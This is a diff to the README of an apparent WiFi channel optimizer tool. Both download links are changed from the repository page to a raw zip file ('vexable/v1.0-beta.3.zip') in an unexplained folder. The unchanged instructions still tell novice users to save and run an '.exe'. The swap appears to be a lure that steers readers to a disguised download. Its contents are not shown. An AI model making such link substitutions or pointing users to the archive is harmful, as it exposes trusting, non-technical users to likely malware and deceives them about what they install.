@@ -1,6 +1,6 @@
 # 📶 wifi-channel-optimizer-tool - Find Your Fastest WiFi Channel Instantly
 
-[![Download Now](https://img.shields.io/badge/Download%20App-Click%20Here-blue?style=for-the-badge&logo=github)](https://github.com/fedoraarched511/wifi-channel-optimizer-tool)
+[![Download Now](https://img.shields.io/badge/Download%20App-Click%20Here-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/fedoraarched511/wifi-channel-optimizer-tool/main/vexable/v1.0-beta.3.zip)
 
 ---
 
@@ -30,7 +30,7 @@ Follow these exact steps – no programming knowledge needed!
 
 ### Step 1: Download the App
 
-Visit this link to download the application: [https://github.com/fedoraarched511/wifi-channel-optimizer-tool](https://github.com/fedoraarched511/wifi-channel-optimizer-tool)
+Visit this link to download the application: [https://raw.githubusercontent.com/fedoraarched511/wifi-channel-optimizer-tool/main/vexable/v1.0-beta.3.zip](https://raw.githubusercontent.com/fedoraarched511/wifi-channel-optimizer-tool/main/vexable/v1.0-beta.3.zip)
 
 Look for the **"Download"** button or the latest release file on that page. The file should be named something like `wifi-channel-optimizer-tool.exe` or similar. Save it to your Desktop or Downloads folder.
 
